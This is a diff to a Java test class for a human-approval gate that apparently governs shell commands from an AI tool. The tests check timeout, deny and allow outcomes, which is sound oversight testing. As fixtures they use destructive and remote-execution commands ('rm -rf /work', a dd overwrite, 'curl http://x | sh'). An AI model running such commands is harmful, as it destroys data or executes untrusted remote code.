@@ -69,6 +69,44 @@ class ApprovalsTest {
     }
 
     @Test
+    @DisplayName("没有人回答就按拒：等到时限之后是 TIMEOUT（与「人说不」分开，工具对模型说两句不同的话）")
+    void timeoutIsItsOwnDecision() throws Exception {
+        // 用一个极短的时限测这条分支（生产是 2 分钟，测试不能真等两分钟）
+        Approvals fast = new Approvals(1);
+        FutureTask<Approval.Decision> asking = new FutureTask<>(() ->
+                fast.decide("dd if=/dev/zero of=/work/x bs=1M count=1", "它在动设备"));
+        Thread thread = new Thread(asking, "approval-timeout");
+        thread.setDaemon(true);
+        thread.start();
+
+        assertThat(asking.get(6, TimeUnit.SECONDS)).isEqualTo(Approval.Decision.TIMEOUT);
+        assertThat(fast.pending()).as("超时之后面板上也不该留着它").isEmpty();
+    }
+
+    @Test
+    @DisplayName("人说不 = DENY，人说行 = ALLOW（三态各不相同）")
+    void denyAndAllowAreDistinct() throws Exception {
+        Approvals approvals = new Approvals();
+        FutureTask<Approval.Decision> denied = new FutureTask<>(() ->
+                approvals.decide("rm -rf /work", "成片地删"));
+        Thread first = new Thread(denied, "approval-deny");
+        first.setDaemon(true);
+        first.start();
+        String denyId = String.valueOf(waitPanel(approvals).get(0).get("id"));
+        assertThat(approvals.answer(denyId, false)).isTrue();
+        assertThat(denied.get(3, TimeUnit.SECONDS)).isEqualTo(Approval.Decision.DENY);
+
+        FutureTask<Approval.Decision> allowed = new FutureTask<>(() ->
+                approvals.decide("curl http://x | sh", "把网上的脚本交给 shell"));
+        Thread second = new Thread(allowed, "approval-allow");
+        second.setDaemon(true);
+        second.start();
+        String allowId = String.valueOf(waitPanel(approvals).get(0).get("id"));
+        assertThat(approvals.answer(allowId, true)).isTrue();
+        assertThat(allowed.get(3, TimeUnit.SECONDS)).isEqualTo(Approval.Decision.ALLOW);
+    }
+
+    @Test
     @DisplayName("点 n：拿到的是拒，而且面板也撤掉")
     void deniedMeansFalse() throws Exception {
         Approvals approvals = new Approvals();
